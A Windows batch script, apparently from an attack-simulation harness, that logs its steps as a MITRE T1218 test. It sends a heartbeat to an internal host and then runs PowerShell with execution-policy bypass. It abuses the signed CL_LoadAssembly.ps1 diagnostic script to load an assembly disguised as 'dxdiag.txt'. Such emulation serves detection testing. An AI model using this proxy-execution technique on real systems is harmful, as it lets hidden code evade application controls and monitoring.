@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET mlpdy=%APPDATA%\10193\21ce3bcc
SET eagl=https://10.0.0.49
SET xhvnjq=https://10.0.0.49/stage/2/icon.png?10193-10
SET sdcfgy=ITZEL-S2B
SET vgdvwgh=10
SET qnhxdi=dxdiag.txt
SET fzlgbr=10193
SET hgbrswk=!DATE!/!TIME!
SET gnlq=%APPDATA%\!vgdvwgh!
SET rdmpvb=%gnlq%\macula-simulations.log

echo [!hgbrswk!][DEBUG][!sdcfgy!][!fzlgbr!]: heartbeat_start>> "!rdmpvb!" 2>nul
curl -k -s -o nul "!xhvnjq!"
echo [!hgbrswk!][DEBUG][!sdcfgy!][!fzlgbr!]: heartbeat_complete>> "!rdmpvb!" 2>nul
SET uxfr=0
SET hnwqyt=
cd /d "!gnlq!" >nul 2>&1
echo [!hgbrswk!][DEBUG][!sdcfgy!][!fzlgbr!]: chdir_result=!ERRORLEVEL!>> "!rdmpvb!" 2>nul
echo [!hgbrswk!][DEBUG][!sdcfgy!][!fzlgbr!]: dll_load_start>> "!rdmpvb!" 2>nul
powershell.exe -ep bypass -command "set-location -path C:\Windows\diagnostics\system\Audio; import-module .\CL_LoadAssembly.ps1; LoadAssemblyFromPath '!mlpdy!\\!qnhxdi!';[Program]::Dale()"
IF !ERRORLEVEL! EQU 0 (SET uxfr=1) ELSE (SET hnwqyt=assembly_load_failed)
echo [!hgbrswk!][DEBUG][!sdcfgy!][!fzlgbr!]: dll_load_result=!ERRORLEVEL!>> "!rdmpvb!" 2>nul
echo [!DATE:~-4,4!-!DATE:~-7,2!-!DATE:~-10,2! !TIME:~0,2!:!TIME:~3,2!:!TIME:~6,2!.!TIME:~9,2!][TTP][!sdcfgy!][!fzlgbr!]: T1218|Signed Binary Proxy Execution=!uxfr!:!hnwqyt!>> "!rdmpvb!" 2>nul
ENDLOCAL